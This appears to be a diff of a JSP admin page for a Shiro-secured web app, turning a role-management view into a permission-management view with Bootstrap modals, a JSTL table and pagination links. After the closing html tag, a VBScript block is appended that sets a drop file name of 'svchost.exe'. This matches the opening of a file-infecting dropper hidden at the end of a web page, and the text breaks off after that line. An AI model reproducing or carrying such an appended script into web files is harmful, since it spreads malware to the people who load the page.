@@ -3,315 +3,278 @@
 <%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="jstl" %>
 <%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>
 <html lang="en">
-  <head>
+<head>
     <meta charset="utf-8">
     <title>角色管理</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link href="/resources/css/bootstrap.css" rel="stylesheet">
-	<link href="/resources/css/site.css" rel="stylesheet">
+    <link href="/resources/css/bootstrap.css" rel="stylesheet">
+    <link href="/resources/css/site.css" rel="stylesheet">
     <link href="/resources/css/bootstrap-responsive.css" rel="stylesheet">
     <!--[if lt IE 9]>
-      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
-  </head>
-  <body>
-    <div class="navbar navbar-fixed-top">
-      <div class="navbar-inner">
+</head>
+<body>
+<div class="navbar navbar-fixed-top">
+    <div class="navbar-inner">
         <div class="container-fluid">
-          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-          </a>
-          <a class="brand" href="#">Admin</a>
-          <div class="btn-group pull-right">
-			<a class="btn" href="my-profile.jsp"><i class="icon-user"></i> Admin</a>
-            <a class="btn dropdown-toggle" data-toggle="dropdown" href="#">
-              <span class="caret"></span>
+            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
             </a>
-            <ul class="dropdown-menu">
-			  <li> <a href="#">个人资料</a>   </li>
-              <li class="divider"></li>
-              <li><a href="/user/login">登出</a></li>
-            </ul>
-          </div>
-          <div class="nav-collapse">
-            <ul class="nav">
-			<li><a href="/admin/index">主页</a></li>
-                <shiro:hasPermission name="用户管理">
-                    <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">用户 <b class="caret"></b></a>
-                        <ul class="dropdown-menu">
-                            <li><a href="#">新建用户</a></li>
-                            <li class="divider"></li>
-                            <li><a href="/admin/users">用户管理</a></li>
-                        </ul>
-                    </li>
-                </shiro:hasPermission>
-              <shiro:hasPermission name="角色管理">
-                  <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">角色 <b class="caret"></b></a>
-                      <ul class="dropdown-menu">
-                          <li><a href="#">新建角色</a></li>
-                          <li class="divider"></li>
-                          <li><a href="/admin/roles">角色管理</a></li>
-                      </ul>
-                  </li>
-              </shiro:hasPermission>
-              <shiro:hasPermission name="权限管理">
-                  <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">权限 <b class="caret"></b></a>
-                      <ul class="dropdown-menu">
-                          <li><a href="#">新建权限</a></li>
-                          <li class="divider"></li>
-                          <li><a href="/admin/PermissionManager">权限管理</a></li>
-                      </ul>
-                  </li>
-              </shiro:hasPermission>
-            </ul>
-          </div>
+            <a class="brand" href="#">Admin</a>
+            <div class="btn-group pull-right">
+                <a class="btn" href="my-profile.jsp"><i class="icon-user"></i> Admin</a>
+                <a class="btn dropdown-toggle" data-toggle="dropdown" href="#">
+                    <span class="caret"></span>
+                </a>
+                <ul class="dropdown-menu">
+                    <li><a href="my-profile.jsp">Profile</a></li>
+                    <li class="divider"></li>
+                    <li><a href="/">登出</a></li>
+                </ul>
+            </div>
+            <div class="nav-collapse">
+                <ul class="nav">
+                    <li><a href="/admin/index">主页</a></li>
+                    <shiro:hasPermission name="用户管理">
+                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">用户 <b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="#">新建用户</a></li>
+                                <li class="divider"></li>
+                                <li><a href="/admin/users">用户管理</a></li>
+                            </ul>
+                        </li>
+                    </shiro:hasPermission>
+                    <shiro:hasPermission name="角色管理">
+                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">角色 <b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="#">新建角色</a></li>
+                                <li class="divider"></li>
+                                <li><a href="/admin/roles">角色管理</a></li>
+                            </ul>
+                        </li>
+                    </shiro:hasPermission>
+                    <shiro:hasPermission name="权限管理">
+                        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">权限 <b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="#">新建权限</a></li>
+                                <li class="divider"></li>
+                                <li><a href="/admin/PermissionManager">权限管理</a></li>
+                            </ul>
+                        </li>
+                    </shiro:hasPermission>
+                </ul>
+            </div>
         </div>
-      </div>
     </div>
+</div>
 
-    <div class="container-fluid">
-      <div class="row-fluid">
+<div class="container-fluid">
+    <div class="row-fluid">
         <div class="span3">
-          <div class="well sidebar-nav">
-            <ul class="nav nav-list">
-              <li class="nav-header"><i class="icon-wrench"></i> Administration</li>
-              <li><a href="/admin/users">用户</a></li>
-              <li class="active"><a href="/admin/roles">角色</a></li>
-              <li class="nav-header"><i class="icon-signal"></i> Statistics</li>
-              <li><a href="stats.html">General</a></li>
-              <li><a href="user-stats.html">用户</a></li>
-              <li><a href="visitor-stats.html">游客</a></li>
-              <li class="nav-header"><i class="icon-user"></i> Profile</li>
-              <li><a href="/admin/profile"></a>个人信息</li>
-              <li><a href="#">设置</a></li>
-			  <li><a href="/">登出</a></li>
-            </ul>
-          </div>
+            <div class="well sidebar-nav">
+                <ul class="nav nav-list">
+                    <li class="nav-header"><i class="icon-wrench"></i> Administration</li>
+                    <li><a href="/admin/users">用户</a></li>
+                    <li class="active"><a href="/admin/roles">角色</a></li>
+                    <li class="nav-header"><i class="icon-signal"></i> Statistics</li>
+                    <li><a href="stats.html">General</a></li>
+                    <li><a href="user-stats.html">用户</a></li>
+                    <li><a href="visitor-stats.html">游客</a></li>
+                    <li class="nav-header"><i class="icon-user"></i> Profile</li>
+                    <li><a href="/admin/profile">个人信息</a></li>
+                    <li><a href="#">设置</a></li>
+                    <li><a href="/">登出</a></li>
+                </ul>
+            </div>
         </div>
         <div class="span9">
-		  <div class="row-fluid">
-			<div class="page-header">
-				<h1>角色 <small>角色管理</small></h1>
-			</div>
-	       <!--- 整合开始   -->
-
-			  <table class="table table-bordered">
-				  <caption>
-					  管理员权限
-				  </caption>
-				  <button class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
-					  新建角色
-				  </button>
-				  <!-- 模态框（Modal） -->
-				  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
-					  <div class="modal-dialog">
-						  <div class="modal-content">
-							  <div class="modal-header">
-								  <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
-									  &times;
-								  </button>
-								  <h4 class="modal-title" id="myModalLabel">
-									  新建一个角色
-								  </h4>
-							  </div>
-							  <form id="roleform" method="post" action="/admin/addRole">
-								  <div class="modal-body">
-									  角色名：<input name="rolename" type="text" placeholder="如：老师" class="form-control input-lg website-input">
-                                  </div>
-                                  <div class="modal-body">
-									  角色描述：<input name="aboutRole" type="text" placeholder="如:祖国的花朵" class="form-control input-lg website-input">
-								  </div>
-
-
-								  <div class="modal-footer">
-									  <button type="button" class="btn btn-default" data-dismiss="modal">关闭
-									  </button>
-									  <button type="submit"  id="roleBtn"  class="btn btn-primary">
-										  新建
-									  </button>
-								  </div>
-							  </form>
-
-						  </div><!-- /.modal-content -->
-					  </div><!-- /.modal -->
-				  </div><!---  modal end --->
+            <div class="row-fluid">
+                <div class="page-header">
+                    <h1>权限 <small>权限管理</small></h1>
+                </div>
+                <!--- 整合开始   -->
 
 
 
-				  <thread>
-					  <tr>
-						  <th>
-							  编号
-						  </th>
-						  <th>
-							  角色id
-						  </th>
-						  <th>
-							  角色名
-						  </th>
-						  <th>
-								描述
-						  </th>
-						  <th>
-							  管理员操作
-						  </th>
+                <table class="table table-bordered">
+                    <caption>
+                        管理员权限
+                    </caption>
+                    <button class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
+                        新建权利
+                    </button>
+                    <!-- 模态框（Modal） -->
+                    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                        <div class="modal-dialog">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+                                        &times;
+                                    </button>
+                                    <h4 class="modal-title" id="myModalLabel">
+                                        新建一个权利
+                                    </h4>
+                                </div>
+                                <form method="post" action="/admin/addPermission">
 
-					  </tr>
-				  </thread>
+                                    <div class="modal-body">
+                                        <div class="form-group">
+                                            <label for="permission" class="control-label">权利名：</label>
+                                            <input type="text" class="form-control" id="permission" name="permission" placeholder="教师入口" >
+                                        </div>
+                                        <div   class="form-group">
+                                            <label for="url" class="control-label">Url：</label>
+                                            <input name="url" type="text" id="url" placeholder="/admin/teacher">
+                                        </div>
+                                    </div>
+                                    <div class="modal-footer">
+                                        <button type="button" class="btn btn-default" data-dismiss="modal">关闭
+                                        </button>
+                                        <button type="submit" class="btn btn-primary">
+                                            新建
+                                        </button>
+                                    </div>
+                                </form>
 
+                            </div><!-- /.modal-content -->
+                        </div><!-- /.modal -->
+                    </div>
 
-				  <!---  新代码开始 --->
-
-                  <jstl:forEach var="role" items="${pager.getpagerData()}" varStatus="status">
-
-                      <tr>
-                          <td>
-                              ${status.count}
-                          </td>
-                          <td >
-                              ${role.roleId}
-                          </td>
-                          <td >
-                              ${role.rolename}
-                          </td>
-                          <td>
-                              ${role.aboutRole}
-                          </td>
-                          <td>
-
-                              <button class="btn btn-primary" data-toggle="modal" data-target="#Moda${status.count}">
-                                  修改 <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>
-                              </button>
-                              <!-- 模态框（Modal） -->
-                              <div class="modal fade" id="Moda${status.count}" tabindex="-1" role="dialog" aria-labelledby="ModalLabel${status.count}" aria-hidden="true">
-                                  <div class="modal-dialog">
-                                      <div class="modal-content">
-                                          <div class="modal-header">
-                                              <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
-                                                  &times;
-                                              </button>
-                                              <h4 class="modal-title" id="ModalLabel${status.count}">
-                                                  修改角色信息
-                                              </h4>
-                                          </div>
-
-                                          <form method="post" action="/admin/updateRole?id=${role.roleId}&pageindex=${pager.pageOffset}" >
-                                              <div class="modal-body">
-                                                  角色名：<input name="rolename" type="text" value="${role.rolename}" class="form-control input-lg website-input">
-                                              </div>
-                                              <div class="modal-body">
-                                                  角色描述：<input name="describe" type="text" value="${role.aboutRole}" class="form-control input-lg website-input">
-                                              </div>
-                                              <div class="modal-footer">
-                                                  <button type="button" class="btn btn-default" data-dismiss="modal">关闭
-                                                  </button>
-                                                  <button type="submit" class="btn btn-primary">
-                                                      修改
-                                                  </button>
-                                              </div>
-                                          </form>
-
-                                      </div><!-- /.modal-content glyphicon glyphicon-pencil -->
-                                  </div><!-- /.modal -->
-                              </div>
-
-                              <button class="btn btn-danger"  onclick="javascript:window.location.href='<%=request.getContextPath()%>/admin/delRole?id=${role.roleId}&pageindex=${pager.pageOffset}';"
-                              >删除
-                                  <span class="glyphicon glyphicon-minus" aria-hidden="true"></span></button>
+                    <thread>
+                        <tr>
+                            <th>
+                                编号
+                            </th>
+                            <th>
+                                权限id
+                            </th>
+                            <th>
+                                权限名
+                            </th>
+                            <th>
+                                权限url
+                            </th>
+                            <th>
+                                管理员操作
+                            </th>
+                        </tr>
+                    </thread>
+<!---   开启model新代码-->
 
 
+                    <jstl:forEach var="permission" items="${pager.getpagerData()}" varStatus="status">
+                        <tbody>
+                        <tr>
+                            <td>
+                                 ${status.count}
+                            </td>
+                            <td >
+                                ${permission.permissionId}
+                            </td>
+                            <td >
+                                ${permission.permission}
+                            </td>
+                            <td>
+                                ${permission.url}
+                            </td>
 
-                              <button class="btn btn-success" data-toggle="modal" data-target="#permissionModal${role.roleId}">
-                                  分配权限
-                              </button>
-                              <!-- 模态框（Modal） -->
-                              <div class="modal fade" id="permissionModal${role.roleId}" tabindex="-1" role="dialog" aria-labelledby="permissionLabel${role.roleId}" aria-hidden="true">
-                                  <div class="modal-dialog">
-                                      <div class="modal-content">
-                                          <div class="modal-header">
-                                              <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
-                                                  &times;
-                                              </button>
-                                              <h4 class="modal-title" id="permissionLabel${role.roleId}">
-                                                  分配多个权限
-                                              </h4>
-                                          </div>
-                                          <form action="/admin/rolePermission?roleId=${role.roleId}&pageindex=${pager.pageOffset}" method="post">
-                                              <div class="modal-body">
+                            <td>
 
-                                             <jstl:forEach var="permissionName" items="${role.hasPermission}">
-                                                 <input  type="checkbox" name="permission" value="${permissionName}" checked>${permissionName}
-                                             </jstl:forEach>
+                                <button class="btn btn-primary" data-toggle="modal" data-target="#myMod${status.count}">
+                                    修改 <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>
+                                </button>
+                                <!-- 模态框（Modal） -->
+                                <div class="modal fade" id="myMod${status.count}" tabindex="-1" role="dialog" aria-labelledby="myModalLabel${status.count}" aria-hidden="true">
+                                    <div class="modal-dialog">
+                                        <div class="modal-content">
+                                            <div class="modal-header">
+                                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+                                                    &times;
+                                                </button>
+                                                <h4 class="modal-title" id="myModalLabel${status.count}">
+                                                    修改权限信息
+                                                </h4>
+                                            </div>
 
-<jstl:forEach var="lackPermission" items="${role.lacksPermission}">
-    <input type="checkbox" name="permission" value="${lackPermission}">${lackPermission}
-</jstl:forEach>
-                                              </div>
-                                              <div class="modal-footer">
-                                                  <button type="button" class="btn btn-default" data-dismiss="modal">关闭
-                                                  </button>
-                                                  <button type="submit"   class="btn btn-primary">
-                                                      分配
-                                                  </button>
-                                              </div>
-                                          </form>
+                                            <form method="post" action="/admin/updatePermission?id=${permission.permissionId}&pageindex=${pager.pageOffset}" >
+                                                <div class="modal-body">
+                                                    权限名：<input name="permissionName" type="text" value="${permission.permission}" class="form-control input-lg website-input">
+                                                </div>
+                                                <div class="modal-body">
+                                                    权限Url：<input name="url" type="text" value="${permission.url}" class="form-control input-lg website-input">
+                                                </div>
+                                                <div class="modal-footer">
+                                                    <button type="button" class="btn btn-default" data-dismiss="modal">关闭
+                                                    </button>
+                                                    <button type="submit" class="btn btn-primary">
+                                                        修改
+                                                    </button>
+                                                </div>
+                                            </form>
 
-                                      </div><!-- /.modal-content -->
-                                  </div><!-- /.modal -->
-                              </div>
+                                        </div><!-- /.modal-content glyphicon glyphicon-pencil -->
+                                    </div><!-- /.modal -->
+                                </div>
+                                <button class="btn btn-danger"  onclick="javascript:window.location.href='<%=request.getContextPath()%>/admin/delPermission?id=${permission.permissionId}&pageindex=${pager.pageOffset}';"
+                                >删除
+                                    <span class="glyphicon glyphicon-minus" aria-hidden="true"></span></button>
+                            </td>
+                        </tr>
+                        <tr>
 
-                          </td>
-                      </tr>
-                  </jstl:forEach>
-                  <!--   分页 --->
-                  <tr>
-                      <td>
-                          <ul class="pagination">
-                              <li>
-                                  <a href="/admin/roles/">首页</a>
-                              </li>
-                              <jstl:forEach var="i" begin="1" end="${pager.totalPage}">
-                                  <li>
-                                      <a href="/admin/roles?pageindex=${pager.pageOffset}">${i}</a>
-                                  </li>
-                              </jstl:forEach>
-                          </ul>
-                      </td>
+                        </tr>
+                        </tbody>
+                    </jstl:forEach>
+                    <!-- 分页 --->
+                    <tr>
+                        <td>
+                            <ul class="pagination">
+                                <li>
+                                    <a href="/admin/PermissionManager/">首页</a>
+                                </li>
+                                <jstl:forEach var="i" begin="1" end="${pager.totalPage}">
+                                    <li>
+                                        <a href="/admin/PermissionManager?pageindex=${i}">${i}</a>
+                                    </li>
+                                </jstl:forEach>
 
-                  </tr>
-				  <!--   新代码 结束
-				     -->
-			  </table>
+                            </ul>
+                        </td>
 
-			  <!--- 整合结束 -->
-		  </div>
+                    </tr>
+                   </tbody>
+                </table>
+
+                <!--- 整合结束 -->
+            </div>
         </div>
-      </div>
-
-      <hr>
-
-      <footer class="well">
-        &copy; Admin
-      </footer>
     </div>
-	<script src="/resources/js/jquery.js"></script>
-	<script src="/resources/js/jquery.min.js"></script>
-	<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-	<script src="https://cdn.bootcss.com/bootstrap-validator/0.5.3/js/bootstrapValidator.js"></script>
-	<script>
-	$(document).ready(function() {
-		$('.dropdown-menu li a').hover(
-		function() {
-			$(this).children('i').addClass('icon-white');
-		},
-		function() {
-			$(this).children('i').removeClass('icon-white');
-		});
-	});
-	</script>
-  </body>
+
+    <hr>
+
+    <footer class="well">
+        &copy; Admin
+    </footer>
+
+</div>
+
+<script src="/resources/js/jquery.js"></script>
+<script src="/resources/js/bootstrap.min.js"></script>
+<script>
+    $(document).ready(function() {
+        $('.dropdown-menu li a').hover(
+            function() {
+                $(this).children('i').addClass('icon-white');
+            },
+            function() {
+                $(this).children('i').removeClass('icon-white');
+            });
+    });
+</script>
+</body>
 </html>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
